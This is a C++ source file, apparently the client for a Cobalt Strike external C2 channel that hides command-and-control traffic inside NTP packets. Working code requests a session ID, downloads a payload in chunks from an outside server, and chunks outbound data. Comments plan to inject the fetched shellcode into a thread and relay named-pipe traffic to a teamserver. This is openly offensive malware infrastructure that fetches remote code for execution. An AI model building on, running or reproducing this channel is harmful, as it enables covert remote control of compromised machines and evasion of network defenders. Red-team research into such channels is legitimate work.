/*

CS-EXTC2-NTP

*/
#include <iostream>
#include "createntp.hpp"
#include "parsentp.hpp"
#include "ntp.hpp"
#include "constants.hpp"
#include "helpers.hpp"
#include "net.hpp"
#include <vector>

std::vector<uint8_t> size_tToBytes(size_t value) {
	std::vector<uint8_t> bytes(sizeof(size_t));
	std::memcpy(bytes.data(), &value, sizeof(size_t));
	return bytes;
}

std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> sessionId) {
	std::cout << "======================" << std::endl;
	std::cout << "Started Chunking		" << std::endl;
	std::cout << "======================" << std::endl;
	//packetDebugger(data);
	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
	uint64_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
	std::vector<uint8_t> responseDataBuffer = {};
	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder

	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
	std::cout << "[?] Max Chunk Size: " << Chunk::maxChunkSize << std::endl;
	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;

	/*
	Need to send a size message to tell the server that the total message length will be X size, for chunking purposes. 
	*/
	auto packetToNotifyServerOfSize = NTPPacket();
	auto incomingSize = size_tToBytes(dataSize);
	//std::vector<uint8_t> emptySessionId = { 0xFF, 0xFF, 0xFF, 0xFF };

	packetToNotifyServerOfSize.addExtensionField(
		NtpExtensionField::sizePacket, //NtpExtensionField::giveMePayload,
		incomingSize,
		sessionId
	);
	std::cout << "[?] Sending size packet " << std::endl;
	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
	std::vector<uint8_t> response = sendChunk(packetToNotifyServerOfSizeBytes);
	
	// Loop over each chunk index
	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
		size_t end = std::min(start + Chunk::maxChunkSize, dataSize); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)

		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);

		//std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
		//printHexVector(chunkData);

		//Print that we're sending a packet, adn what type of packet it is.
		std::cout << "----------------------" << std::endl;
		std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
		std::cout << "----------------------" << std::endl;

		//creat ntp packet first
		auto packet = NTPPacket();
		packet.addExtensionField(
			extensionField, //NtpExtensionField::giveMePayload,
			chunkData,
			sessionId //REPLACE ME WITH REAL SESSION ID
		);

		//pass full ntp packet 
		std::vector < uint8_t> packet_bytes = packet.getPacket();
		//run the debugger directly on the incoming respnose packet
		packetDebugger(packet_bytes);
		std::vector<uint8_t> response = sendChunk(packet_bytes);

		//Print that we've received  a packet, and then print debug items below it
		std::cout << "----------------------" << std::endl;
		std::cout << "Recieved Response Packet" << std::endl;
		std::cout << "----------------------" << std::endl;
		//run the debugger directly on the incoming respnose packet
		packetDebugger(response);

		//Parse NTP packet, get data out of it (or whatever else is needed)
		NTPPacketParser responsePacketParser = NTPPacketParser(response);
		//Get extension data:
		std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();

		//take extracted extension data, put into buffer
		responseDataBuffer.insert(responseDataBuffer.end(), extensionData.begin(), extensionData.end()); // append response to responseBuffer

	}
	//print full response data
	std::cout << "[?] Full Data from Responses: ";
	printHexVector(responseDataBuffer);

	std::cout << "======================" << std::endl;
	std::cout << "Finished Chunking		" << std::endl;
	std::cout << "======================" << std::endl;

	//when done looping, return array
	//std::vector<uint8_t> placehodlerVec = {};
	return responseDataBuffer;
}


/*
* helper to get payload 
*/
std::vector<uint8_t> getPayload(std::vector<uint8_t> sessionId) {
	//Create pcaket
	auto packet = NTPPacket();
	//packet.printPacket();
	std::vector<uint8_t> packetData = { 0x86 }; //packetData on giveMePayload asks for arch?
	std::vector<uint8_t> zeroPacketData = { 0x00 }; //packetData on giveMePayload asks for arch?

	//Chunking here to get the payload
	//response from serer will be size, so need to get size, and chunk over that, and insert into payloadBuffer
	//probably shoudln't use chunker here, or at least modify chunker to be a send only mechanism? I dunno
	//std::vector<uint8_t> payloadBuffer = chunker(
	//	packetData,
	//	NtpExtensionField::giveMePayload,
	//	Client::emptySessionId
	//);
	// 
	// 
	// 

	//modified way of doing this.

	//temp session id

	//1. Send a NtpExtensionField::giveMePayload packet. This returns size of inbound payload
	NTPPacket giveMePayloadPacketClass;
	giveMePayloadPacketClass.addExtensionField(
		NtpExtensionField::giveMePayload,
		packetData,
		sessionId //placeholder until real id

	);
	std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
	std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);

	//get size from packet
	NTPPacketParser sizePacketParsererClass(responsePacket);


	auto payloadSizeVector = sizePacketParsererClass.getExtensionData();

	//clientid not in server responses atm,so manually extract. This was the bug
	//std::vector<uint8_t> size;
	//size.insert(size.begin(), payloadSizeVector.begin() + 56, payloadSizeVector.end());

	//printHexVector(size);

	//probelm here with size
	//uint32_t payloadSize = vectorToUint32(payloadSizeVector);
	uint32_t payloadSize = vectorToUint32(payloadSizeVector);

	//uint32_t payloadSize = 0;
	//std::memcpy(&payloadSize, responsePacket.data(), sizeof(payloadSize));
	//uint32_t payloadSize = vectorToUint32(responsePacket.getPacket())

	//2. Iterate over size, and send a 0x00 (NtpExtensionField::giveMePayload) packet, until all data has been recieved.

	//create our packet first so we don't have to keep re-creating it
	NTPPacket getMoreOfPayloadPacketClass;
	getMoreOfPayloadPacketClass.addExtensionField(
		NtpExtensionField::giveMePayload,
		zeroPacketData,
		sessionId //placeholder until real id
	);
	std::vector<uint8_t> getMoreOfPayloadPacket = getMoreOfPayloadPacketClass.getPacket();

	std::vector<uint8_t> payloadBuffer;
	std::cout << "Retrieveing payload of size " << payloadSize << std::endl;
	uint32_t counter = 0;

	while (payloadBuffer.size() < payloadSize) {
		//send chunk and get data out of it
		std::vector<uint8_t> responsePacket = sendChunk(getMoreOfPayloadPacket);

		//parse
		NTPPacketParser parsedPacketClass(responsePacket);
		std::vector<uint8_t> extensionData = parsedPacketClass.getExtensionData();

		//add data to vector
		payloadBuffer.insert(payloadBuffer.end(), extensionData.begin(), extensionData.end());

		std::cout << "Packet [" << counter << "/" << payloadSize/Chunk::maxChunkSize << "]" << std::endl;
		counter++;
	}

	//3. This should now be the payload data. 


	return payloadBuffer;
}

std::vector<uint8_t> getId() {
	std::cout << "[?] Getting Session ID" << std::endl;
	std::vector<uint8_t> packetData = {}; //empty cuz it doesn't need anything

	NTPPacket giveMePayloadPacketClass;
	giveMePayloadPacketClass.addExtensionField(
		NtpExtensionField::getIdPacket,
		packetData,
		Client::emptySessionId
	);
	std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
	std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);

	NTPPacketParser responsePacketParser = NTPPacketParser(responsePacket);
	//Get extension data:
	//std::vector<uint8_t> extensionData = responsePacketParser.getExtensionSessionId();
	std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();


	return extensionData;
}

int main() {
	//Stuff here

	std::cout << "Started" << std::endl;

	//0. Get Session ID from server
	//std::cout << "[?] Session ID: ";
	//printHexVector(getId());
	std::vector<uint8_t> sessionId = getId();

	//1. Get Payload
	std::vector<uint8_t> payloadBytes = getPayload(sessionId);

	//2. run payload

	//3. read from pipe & send back
	//sess id is here cuz it's per comm to track chunking


}



//Note, have payload functino be simiar to above, but diff due to data coming back and needing to be retuend

//void logic() {

	//! Need a dedicated chunking function, that does the chunking logic,and just easily returns the response fromthe server

	//3 seperate functions of how to do this now:

	//GetPayload function(){};
	//Create payload packet (giveMePayload)

	//Send giveMePayload packet
		// > Get size of payload from sizePacket
		// > iterate over payload chunks until data = what was in size packet


	//InjectPayload function();
	//Injection method for running shellcode, go with basic injection method, with a thread.

	//ReadPipe Function();
	//attempt to read pipe
		//	
		//send data to teamserver: sendDataToTeamServer
		//recieve data from teamserver with getDataFromTeamserver, in response

	//attempt to write to pipe
	//goto attempt to read pipe
//}

/*
Next steps:

// Standard data transfer

Figure out chunking. Might be best to one func this, or class it. OneFunc may be easier short term 
 - Initial packet to say overall size (maybe extensionField of 0x51 0x33) //bad SIZE rep in hex: 0x51 0x23

 - After initial packet, wait for next packet, which will be first in data packets. Math can be done for how many packets to expect

 - After packets are done, return completed buffer (in a vector). That can get passed to whatever it needs to


 // Payload Retrieval

Uses the same exact chunker as above, BUT, uses adiff header. Maybe '0x10 0xAD' for (pay)load

Then call injection logic to run payload.

*/